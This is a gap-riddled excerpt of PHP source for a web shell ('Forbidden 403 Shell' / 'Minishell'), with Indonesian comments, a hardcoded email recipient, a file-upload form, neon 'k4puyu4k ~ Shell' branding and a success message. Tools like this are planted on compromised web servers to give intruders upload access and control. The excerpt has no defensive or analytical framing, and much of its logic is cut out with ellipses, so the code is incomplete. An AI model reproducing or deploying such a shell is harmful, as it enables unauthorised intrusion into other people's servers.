...
// Forbidden 403 Shell | r00t ~ Dhen Bhocil Minishell 
// Recorde Tapi izin dlu ngntd:v
...
$to_email = 'kittinggans@gmail.com';
...
<link rel="icon" href=" "><meta name="theme-color" content="black"> </meta> <!--Buat Thumbnail website--> 
...
<form enctype="multipart/form-data" method="post">
  <td align="center">
     <center><p class="blink_text" style="font-size:50px;color:lime;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;">&lt;/&gt;  k4puyu4k ~ Shell &lt/&gt; </font></center>
          <br>      
...
<h1><font class="Skranji" style="color:white;font-family:'Kelly Slab';font-size: 15px;">Copyright &copy; 2K20 <font color="lime">Rta7</h1>
      <br>
...
<center><p class="blink_text" style="font-size:50px;color:lime;text-shadow: 0px 0px 20px #000 , 0px 0px 20px #000;font-family:Kelly Slab;">&lt;/&gt;  k4puyu4k ~ Shell &lt;/&gt; </font></center>
<style>
body{
...
echo '<font color="lime"> Berhasil Mank </font><br />';
}else{
...
echo '<font face="Kelly Slab" color="white" size="2px"><center><br/><b>Copyright &copy; 2K20 <font color="lime">Dhen Bhocil</a></center></font>
